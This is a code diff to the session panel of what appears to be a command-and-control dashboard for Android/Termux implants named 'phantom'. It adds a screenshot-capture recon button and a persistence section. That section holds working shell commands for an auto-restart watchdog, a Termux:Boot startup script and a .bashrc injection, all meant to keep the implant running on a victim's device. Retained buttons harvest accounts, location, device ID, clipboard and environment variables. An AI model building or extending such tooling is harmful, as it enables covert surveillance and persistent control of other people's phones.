@@ -394,16 +394,16 @@ export default function Sessions({ onOpenTerminal }: Props) {
 
                         {/* RECON */}
                         <div>
-                          <div className="text-[9px] text-muted uppercase tracking-widest mb-1">🔍 Recon & Persistence</div>
+                          <div className="text-[9px] text-muted uppercase tracking-widest mb-1">🔍 Recon</div>
                           <div className="flex flex-wrap gap-1">
                             {[
                               { l:'Accounts',     c:"dumpsys account 2>/dev/null | grep -E 'Account \\{|type=|name=' | head -40" },
                               { l:'Android ID',   c:"settings get secure android_id 2>/dev/null" },
                               { l:'Location',     c:"dumpsys location 2>/dev/null | grep -E 'Last Known|mLastLocation' | head -10" },
-                              { l:'Settings',     c:'settings list secure 2>/dev/null | head -40' },
                               { l:'Clipboard',    c:'termux-clipboard-get 2>/dev/null || echo no-termux-api' },
                               { l:'ENV vars',     c:'env' },
                               { l:'Crontab',      c:'crontab -l 2>/dev/null || echo no-crontab' },
+                              { l:'Screenshot',   c:'screencap -p /sdcard/Download/sc.png 2>/dev/null && echo "saved: /sdcard/Download/sc.png" || echo "needs root"' },
                             ].map(q => (
                               <button key={q.l} onClick={() => execute(s, q.c)} disabled={isExec}
                                 className="px-2 py-1 rounded text-[9px] border border-border/70 text-muted hover:border-danger hover:text-danger transition-colors disabled:opacity-40">
@@ -413,8 +413,52 @@ export default function Sessions({ onOpenTerminal }: Props) {
                           </div>
                         </div>
 
+                        {/* PERSISTENCE */}
+                        <div className="bg-danger/5 border border-danger/20 rounded-lg p-2">
+                          <div className="text-[9px] text-danger uppercase tracking-widest mb-2 flex items-center gap-1">
+                            🔒 Persistence (حافظ على الـ Session حتى بعد الـ Restart)
+                          </div>
+                          <div className="flex flex-col gap-1.5">
+                            {/* Restart loop — most reliable */}
+                            <div>
+                              <div className="text-[9px] text-muted mb-1">1️⃣ Restart Loop (لو الـ implant اتوقف بيشتغل تاني تلقائي)</div>
+                              <button onClick={() => execute(s, "nohup sh -c 'while true; do ~/phantom 2>/dev/null; sleep 15; done' > /dev/null 2>&1 & echo 'Watchdog started'")} disabled={isExec}
+                                className="px-3 py-1.5 rounded text-[10px] w-full text-left border border-danger/40 text-danger hover:bg-danger/10 transition-colors disabled:opacity-40 font-mono">
+                                Start watchdog (auto-restart every 15s)
+                              </button>
+                            </div>
+                            {/* Termux Boot */}
+                            <div>
+                              <div className="text-[9px] text-muted mb-1">2️⃣ Termux:Boot (يشتغل مع فتح Termux — بيستحتاج تحميل Termux:Boot من F-Droid)</div>
+                              <button onClick={() => execute(s, "mkdir -p ~/.termux/boot && printf '#!/data/data/com.termux/files/usr/bin/sh\\nnohup ~/phantom > /dev/null 2>&1 &\\n' > ~/.termux/boot/phantom.sh && chmod +x ~/.termux/boot/phantom.sh && echo 'Boot script installed: ~/.termux/boot/phantom.sh'")} disabled={isExec}
+                                className="px-3 py-1.5 rounded text-[10px] w-full text-left border border-danger/40 text-danger hover:bg-danger/10 transition-colors disabled:opacity-40 font-mono">
+                                Install Termux:Boot script
+                              </button>
+                            </div>
+                            {/* .bashrc */}
+                            <div>
+                              <div className="text-[9px] text-muted mb-1">3️⃣ .bashrc (يشتغل مع كل فتح terminal جديد)</div>
+                              <button onClick={() => execute(s, "grep -q phantom ~/.bashrc 2>/dev/null || echo 'nohup ~/phantom > /dev/null 2>&1 &' >> ~/.bashrc && echo 'Added to .bashrc'")} disabled={isExec}
+                                className="px-3 py-1.5 rounded text-[10px] w-full text-left border border-danger/40 text-danger hover:bg-danger/10 transition-colors disabled:opacity-40 font-mono">
+                                Add to .bashrc
+                              </button>
+                            </div>
+                            {/* Check status */}
+                            <div className="flex gap-1">
+                              <button onClick={() => execute(s, "ps aux 2>/dev/null | grep phantom | grep -v grep || echo 'implant NOT running'")} disabled={isExec}
+                                className="flex-1 px-2 py-1.5 rounded text-[10px] border border-border/50 text-muted hover:border-primary hover:text-primary transition-colors disabled:opacity-40 font-mono">
+                                Check if running
+                              </button>
+                              <button onClick={() => execute(s, "cat ~/.termux/boot/phantom.sh 2>/dev/null; cat ~/.bashrc 2>/dev/null | grep phantom")} disabled={isExec}
+                                className="flex-1 px-2 py-1.5 rounded text-[10px] border border-border/50 text-muted hover:border-primary hover:text-primary transition-colors disabled:opacity-40 font-mono">
+                                Check persistence
+                              </button>
+                            </div>
+                          </div>
+                        </div>
+
                         <div className="border-t border-border/40 pt-2">
-                          <label className="text-[10px] text-muted uppercase tracking-widest mb-2 block">Quick Commands (Android)</label>
+                          <label className="text-[10px] text-muted uppercase tracking-widest mb-2 block">Quick Commands</label>
                         </div>
                       </div>
                     )}
